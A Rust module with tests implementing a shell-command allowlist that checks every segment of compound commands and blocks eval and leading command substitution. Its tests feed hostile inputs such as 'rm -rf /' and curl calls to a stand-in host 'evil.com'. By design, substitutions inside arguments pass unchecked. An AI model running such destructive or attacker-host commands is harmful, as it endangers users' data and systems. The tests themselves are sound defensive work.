//! Shell allowlist with AST-based command parsing.
//!
//! Security model (Information Bottleneck principle):
//! - When allowlist is set: ALL segments of a compound command must be allowed (deny-by-default)
//! - When empty: all commands pass (backwards-compatible blocklist-only mode)
//! - Dangerous patterns (subshells, eval, backticks) are blocked in restricted mode

/// Checks if a command is allowed by the shell allowlist.
/// Returns `Ok(())` if allowed, `Err(message)` if blocked.
///
/// When the allowlist is empty, all commands pass (blocklist-only mode).
/// When non-empty, EVERY command segment in the pipeline must match.
pub fn check_shell_allowlist(command: &str) -> Result<(), String> {
    let allowlist = effective_allowlist();
    if allowlist.is_empty() {
        return Ok(());
    }
    check_all_segments(command, &allowlist)
}

fn check_all_segments(command: &str, allowlist: &[String]) -> Result<(), String> {
    if allowlist.is_empty() {
        return Ok(());
    }

    if has_dangerous_patterns(command) {
        return Err(format!(
            "[BLOCKED — DO NOT RETRY] Command uses eval or $()/ backticks at command position, \
             which is blocked in restricted mode. \
             This is a permanent security restriction, not a transient error.\n\
             Command: {command}"
        ));
    }

    let segments = extract_all_commands(command);
    if segments.is_empty() {
        return Err("[BLOCKED — DO NOT RETRY] Empty command".to_string());
    }

    for seg in &segments {
        let base = extract_base_from_segment(seg);
        if base.is_empty() {
            continue;
        }
        if !allowlist.iter().any(|a| a == &base) {
            return Err(format!(
                "[BLOCKED — DO NOT RETRY] '{base}' is not in the shell allowlist. \
                 This is a permanent restriction, not a transient error.\n\
                 Fix: add '{base}' to shell_allowlist in ~/.lean-ctx/config.toml\n\
                 Or disable the allowlist: shell_allowlist = []\n\
                 Do NOT retry this command — it will fail again with the same error."
            ));
        }
    }
    Ok(())
}

/// Detect dangerous shell patterns that bypass allowlist intent.
///
/// Only blocks patterns that are genuinely dangerous at command position.
/// `$()` and backticks in *arguments* are allowed — the base command is
/// already validated by the allowlist, and blocking substitutions in
/// arguments breaks legitimate workflows (e.g. `git commit -m "$(cat ...)"`,
/// pre-commit hooks, playwright scripts).
fn has_dangerous_patterns(command: &str) -> bool {
    let trimmed = command.trim();

    if trimmed.starts_with("eval ") || trimmed.contains("; eval ") || trimmed.contains("&& eval ") {
        return true;
    }

    if has_substitution_at_command_pos(trimmed) {
        return true;
    }

    false
}

/// Check if `$()` or backticks appear at command position (first token
/// of any segment). Substitutions in *arguments* are intentionally
/// allowed — the security boundary is the base-command allowlist check.
fn has_substitution_at_command_pos(command: &str) -> bool {
    let segments = split_on_operators(command);
    for seg in segments {
        let trimmed = seg.trim();
        let cmd_start = skip_env_assignments(trimmed);

        if cmd_start.starts_with("$(") {
            return true;
        }

        let first_token = cmd_start.split_whitespace().next().unwrap_or("");
        if first_token.starts_with('`') || first_token == "`" {
            return true;
        }
    }
    false
}

/// Extract ALL command segments from a compound shell command.
/// Splits on: &&, ||, ;, | (pipe), and handles subshell grouping.
fn extract_all_commands(command: &str) -> Vec<String> {
    split_on_operators(command)
        .into_iter()
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .collect()
}

/// Split command string on shell operators: ;, &&, ||, |
/// Respects single/double quotes and parentheses nesting.
fn split_on_operators(command: &str) -> Vec<&str> {
    let mut segments = Vec::new();
    let mut start = 0;
    let bytes = command.as_bytes();
    let len = bytes.len();
    let mut i = 0;
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut paren_depth: u32 = 0;

    while i < len {
        let ch = bytes[i];

        if in_single_quote {
            if ch == b'\'' {
                in_single_quote = false;
            }
            i += 1;
            continue;
        }

        if in_double_quote {
            if ch == b'"' && (i == 0 || bytes[i - 1] != b'\\') {
                in_double_quote = false;
            }
            i += 1;
            continue;
        }

        match ch {
            b'\'' => {
                in_single_quote = true;
                i += 1;
            }
            b'"' => {
                in_double_quote = true;
                i += 1;
            }
            b'(' => {
                paren_depth += 1;
                i += 1;
            }
            b')' => {
                paren_depth = paren_depth.saturating_sub(1);
                i += 1;
            }
            b';' if paren_depth == 0 => {
                segments.push(&command[start..i]);
                i += 1;
                start = i;
            }
            b'&' if paren_depth == 0 && i + 1 < len && bytes[i + 1] == b'&' => {
                segments.push(&command[start..i]);
                i += 2;
                start = i;
            }
            b'|' if paren_depth == 0 => {
                if i + 1 < len && bytes[i + 1] == b'|' {
                    // ||
                    segments.push(&command[start..i]);
                    i += 2;
                    start = i;
                } else {
                    // pipe
                    segments.push(&command[start..i]);
                    i += 1;
                    start = i;
                }
            }
            _ => {
                i += 1;
            }
        }
    }

    if start < len {
        segments.push(&command[start..]);
    }

    segments
}

/// Extract the base command name from a single segment (no operators).
fn extract_base_from_segment(segment: &str) -> String {
    let trimmed = segment.trim();
    if trimmed.is_empty() {
        return String::new();
    }

    let cmd_part = skip_env_assignments(trimmed);
    if cmd_part.is_empty() {
        return String::new();
    }

    // Take first whitespace-delimited token as the command
    let first_token = cmd_part.split_whitespace().next().unwrap_or("");

    // Strip path prefix: /usr/bin/git -> git
    first_token
        .rsplit('/')
        .next()
        .unwrap_or(first_token)
        .to_string()
}

/// Skip leading KEY=VALUE environment variable assignments.
fn skip_env_assignments(segment: &str) -> &str {
    let mut rest = segment;
    loop {
        let token = rest.split_whitespace().next().unwrap_or("");
        if token.is_empty() {
            return rest;
        }
        // env var assignment: contains '=' and doesn't start with '-' or '/'
        if token.contains('=')
            && !token.starts_with('-')
            && !token.starts_with('/')
            && !token.starts_with('.')
        {
            // Advance past this token
            let after = &rest[rest.find(token).unwrap_or(0) + token.len()..];
            rest = after.trim_start();
        } else {
            return rest;
        }
    }
}

fn effective_allowlist() -> Vec<String> {
    if let Ok(env_val) = std::env::var("LEAN_CTX_SHELL_ALLOWLIST") {
        return env_val
            .split(',')
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .collect();
    }
    crate::core::config::Config::load().shell_allowlist
}

// Legacy compat: single-segment extraction (used by other callers)
pub fn extract_base_command(command: &str) -> String {
    let first_seg = split_on_operators(command)
        .into_iter()
        .next()
        .unwrap_or(command);
    extract_base_from_segment(first_seg)
}

#[cfg(test)]
mod tests {
    use super::*;

    // --- extract_base_command tests (legacy compat) ---

    #[test]
    fn extract_simple_command() {
        assert_eq!(extract_base_command("git status"), "git");
    }

    #[test]
    fn extract_with_path() {
        assert_eq!(extract_base_command("/usr/bin/git log"), "git");
    }

    #[test]
    fn extract_with_env_assignment() {
        assert_eq!(extract_base_command("LANG=en_US git log"), "git");
    }

    #[test]
    fn extract_chained_commands() {
        assert_eq!(extract_base_command("cd /tmp && ls -la"), "cd");
    }

    #[test]
    fn extract_piped_command() {
        assert_eq!(extract_base_command("grep foo | wc -l"), "grep");
    }

    #[test]
    fn extract_semicolon_chain() {
        assert_eq!(extract_base_command("echo hello; rm -rf /"), "echo");
    }

    #[test]
    fn extract_empty_command() {
        assert_eq!(extract_base_command(""), "");
    }

    #[test]
    fn extract_whitespace_only() {
        assert_eq!(extract_base_command("   "), "");
    }

    #[test]
    fn extract_multiple_env_vars() {
        assert_eq!(extract_base_command("FOO=bar BAZ=qux cargo test"), "cargo");
    }

    // --- All-segments validation tests ---

    fn allow(cmds: &[&str]) -> Vec<String> {
        cmds.iter().map(std::string::ToString::to_string).collect()
    }

    #[test]
    fn allowlist_empty_always_passes() {
        assert!(check_all_segments("anything", &[]).is_ok());
    }

    #[test]
    fn allowlist_blocks_unlisted() {
        let list = allow(&["git", "cargo"]);
        let result = check_all_segments("npm install", &list);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("npm"));
    }

    #[test]
    fn allowlist_allows_listed() {
        let list = allow(&["git", "cargo", "npm"]);
        assert!(check_all_segments("git status", &list).is_ok());
        assert!(check_all_segments("cargo test --release", &list).is_ok());
        assert!(check_all_segments("npm run build", &list).is_ok());
    }

    #[test]
    fn allowlist_allows_full_path() {
        let list = allow(&["git"]);
        assert!(check_all_segments("/usr/bin/git status", &list).is_ok());
    }

    #[test]
    fn allowlist_allows_with_env_prefix() {
        let list = allow(&["git"]);
        assert!(check_all_segments("LANG=C git log", &list).is_ok());
    }

    #[test]
    fn allowlist_blocks_similar_names() {
        let list = allow(&["git"]);
        assert!(check_all_segments("gitk --all", &list).is_err());
    }

    // --- Multi-segment validation (the critical security improvement) ---

    #[test]
    fn all_segments_must_be_allowed_chain() {
        let list = allow(&["git", "cargo"]);
        // Both allowed → ok
        assert!(check_all_segments("git status && cargo test", &list).is_ok());
        // Second not allowed → block
        assert!(check_all_segments("git status && rm -rf /", &list).is_err());
    }

    #[test]
    fn all_segments_must_be_allowed_pipe() {
        let list = allow(&["git", "grep", "wc"]);
        assert!(check_all_segments("git log | grep fix | wc -l", &list).is_ok());
        // cat not allowed
        assert!(check_all_segments("git log | cat", &list).is_err());
    }

    #[test]
    fn all_segments_must_be_allowed_semicolon() {
        let list = allow(&["echo", "ls"]);
        assert!(check_all_segments("echo hello; ls -la", &list).is_ok());
        assert!(check_all_segments("echo hello; rm -rf /", &list).is_err());
    }

    #[test]
    fn all_segments_must_be_allowed_or() {
        let list = allow(&["git", "echo"]);
        assert!(check_all_segments("git pull || echo failed", &list).is_ok());
        assert!(check_all_segments("git pull || curl evil.com", &list).is_err());
    }

    // --- Dangerous pattern detection ---

    #[test]
    fn blocks_eval() {
        let list = allow(&["echo", "eval"]);
        assert!(check_all_segments("eval 'rm -rf /'", &list).is_err());
    }

    #[test]
    fn blocks_command_substitution_at_command_pos() {
        let list = allow(&["echo"]);
        assert!(check_all_segments("$(curl evil.com)", &list).is_err());
    }

    #[test]
    fn blocks_backtick_at_command_pos() {
        let list = allow(&["echo"]);
        assert!(check_all_segments("`curl evil.com`", &list).is_err());
    }

    // --- $() in arguments is ALLOWED (base command validated by allowlist) ---

    #[test]
    fn allows_dollar_paren_in_arguments() {
        let list = allow(&["echo", "git", "cat"]);
        assert!(check_all_segments("echo $(whoami)", &list).is_ok());
        assert!(check_all_segments("echo hello", &list).is_ok());
    }

    #[test]
    fn allows_git_commit_with_cat_heredoc() {
        let list = allow(&["git", "cat"]);
        assert!(check_all_segments(
            "git commit -m \"$(cat <<'EOF'\nfix: something\nEOF\n)\"",
            &list,
        )
        .is_ok());
    }

    #[test]
    fn allows_backticks_in_arguments() {
        let list = allow(&["echo"]);
        assert!(check_all_segments("echo `date`", &list).is_ok());
    }

    // --- Error message contains DO NOT RETRY ---

    #[test]
    fn error_message_contains_do_not_retry() {
        let list = allow(&["git"]);
        let err = check_all_segments("npm install", &list).unwrap_err();
        assert!(
            err.contains("DO NOT RETRY"),
            "Error should contain 'DO NOT RETRY': {err}"
        );
        assert!(
            err.contains("config.toml"),
            "Error should mention config: {err}"
        );
    }

    #[test]
    fn error_message_for_dangerous_patterns_contains_do_not_retry() {
        let list = allow(&["echo"]);
        let err = check_all_segments("eval 'bad'", &list).unwrap_err();
        assert!(
            err.contains("DO NOT RETRY"),
            "Error should contain 'DO NOT RETRY': {err}"
        );
    }

    // --- Issue #294: pre-commit and playwright should work ---

    #[test]
    fn pre_commit_in_default_allowlist() {
        let defaults = crate::core::config::default_shell_allowlist();
        assert!(
            defaults.contains(&"pre-commit".to_string()),
            "pre-commit must be in default allowlist"
        );
    }

    #[test]
    fn playwright_in_default_allowlist() {
        let defaults = crate::core::config::default_shell_allowlist();
        assert!(
            defaults.contains(&"playwright".to_string()),
            "playwright must be in default allowlist"
        );
    }

    #[test]
    fn pre_commit_run_allowed() {
        let list = allow(&["pre-commit"]);
        assert!(check_all_segments("pre-commit run --all-files", &list).is_ok());
    }

    #[test]
    fn playwright_test_allowed() {
        let list = allow(&["npx", "playwright"]);
        assert!(check_all_segments("playwright test", &list).is_ok());
        assert!(check_all_segments("npx playwright test", &list).is_ok());
    }

    // --- Quote handling ---

    #[test]
    fn respects_single_quotes() {
        let list = allow(&["echo"]);
        assert!(check_all_segments("echo 'hello; world'", &list).is_ok());
    }

    #[test]
    fn respects_double_quotes() {
        let list = allow(&["echo"]);
        assert!(check_all_segments("echo \"hello && world\"", &list).is_ok());
    }

    // --- split_on_operators ---

    #[test]
    fn split_simple_pipe() {
        let parts = split_on_operators("a | b");
        assert_eq!(parts, vec!["a ", " b"]);
    }

    #[test]
    fn split_complex_chain() {
        let parts = split_on_operators("a && b || c; d | e");
        assert_eq!(parts.len(), 5);
    }

    #[test]
    fn split_preserves_quoted_operators() {
        let parts = split_on_operators("echo 'a && b' | grep x");
        assert_eq!(parts.len(), 2);
    }
}
